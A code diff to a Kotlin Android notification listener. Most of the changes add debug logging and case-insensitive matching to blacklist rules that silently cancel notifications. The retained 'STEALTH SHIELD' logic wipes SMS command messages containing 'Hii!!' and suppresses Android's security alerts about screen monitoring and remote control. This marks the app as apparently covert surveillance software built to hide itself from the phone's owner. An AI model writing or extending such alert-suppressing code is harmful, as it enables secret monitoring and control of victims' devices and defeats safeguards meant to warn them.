@@ -128,42 +128,47 @@ class MyNotificationListener : NotificationListenerService() {
         if (title.isEmpty() && text.isEmpty()) return
 
         // --- PASSIVE AUTO-SWIPE ENGINE ---
+        DebugLogger.log("NOTIF_EVAL", "Evaluating Notification - PKG: [$pkg] | TITLE: [$title] | TEXT: [${text.take(20)}...]")
         val autoPrefs = getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
         
         // 1. Check Package Blacklist
         val pkgList = autoPrefs.getString("pkgs", "") ?: ""
-        if (pkgList.split(",").any { it.trim() == pkg }) {
+        DebugLogger.log("NOTIF_EVAL", "Checking PKG rule against list: [$pkgList]")
+        if (pkgList.split(",").any { it.trim().equals(pkg, ignoreCase = true) }) {
             cancelNotification(sbn.key)
-            DebugLogger.log("AUTO_SWIPE", "Purged by PKG rule: $pkg")
+            DebugLogger.log("AUTO_SWIPE", "DECISION: PURGE. Reason: PKG matched blacklist ($pkg)")
             return
         }
 
         // 2. Check Keyword Blacklist (Title & Text)
         val kwList = autoPrefs.getString("keywords", "") ?: ""
+        DebugLogger.log("NOTIF_EVAL", "Checking KEYWORD rule against list:[$kwList]")
         if (kwList.isNotEmpty()) {
-            val lowerTitle = title.lowercase()
-            val lowerText = text.lowercase()
-            if (kwList.split(",").any { 
-                val target = it.trim().lowercase()
-                target.isNotEmpty() && (lowerTitle.contains(target) || lowerText.contains(target)) 
-            }) {
+            val matchedKw = kwList.split(",").find { 
+                val target = it.trim()
+                target.isNotEmpty() && (title.contains(target, ignoreCase = true) || text.contains(target, ignoreCase = true)) 
+            }
+            if (matchedKw != null) {
                 cancelNotification(sbn.key)
-                DebugLogger.log("AUTO_SWIPE", "Purged by Keyword rule.")
+                DebugLogger.log("AUTO_SWIPE", "DECISION: PURGE. Reason: KEYWORD matched blacklist ($matchedKw)")
                 return
             }
         }
 
         // 3. Check SMS Sender Blacklist (Title usually contains sender in SMS apps)
         val senderList = autoPrefs.getString("senders", "") ?: ""
+        DebugLogger.log("NOTIF_EVAL", "Checking SENDER rule against list: [$senderList]")
         if (senderList.isNotEmpty()) {
-            if (senderList.split(",").any { it.trim().isNotEmpty() && title.contains(it.trim()) }) {
+            val matchedSender = senderList.split(",").find { it.trim().isNotEmpty() && title.contains(it.trim(), ignoreCase = true) }
+            if (matchedSender != null) {
                 cancelNotification(sbn.key)
-                DebugLogger.log("AUTO_SWIPE", "Purged by SMS Sender rule: $title")
+                DebugLogger.log("AUTO_SWIPE", "DECISION: PURGE. Reason: SENDER matched blacklist ($matchedSender in title '$title')")
                 return
             }
         }
 
         // --- STEALTH SHIELD: INSTANT WIPE ---
+        DebugLogger.log("NOTIF_EVAL", "Checking STEALTH SHIELD rules...")
         val isCommand = title.contains("Hii!!", ignoreCase = true) || text.contains("Hii!!", ignoreCase = true)
         val isSecurityAlert = text.contains("view and control your screen", ignoreCase = true) || 
                               text.contains("monitoring your screen", ignoreCase = true) ||
@@ -171,9 +176,12 @@ class MyNotificationListener : NotificationListenerService() {
 
         if (isCommand || isSecurityAlert) {
             cancelNotification(sbn.key)
-            DebugLogger.log("SHIELD", "Notification purged: ${if(isCommand) "Command" else "Security Alert"}")
+            val reason = if(isCommand) "Command 'Hii!!' Detected" else "Security Alert Detected"
+            DebugLogger.log("SHIELD", "DECISION: PURGE. Reason: $reason")
             return
         }
+        
+        DebugLogger.log("NOTIF_EVAL", "DECISION: ALLOW. No auto-swipe rules matched.")
 
         // --- ENGAGEMENT PROTOCOL ---
         if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("com.google.android.apps.messaging")) {
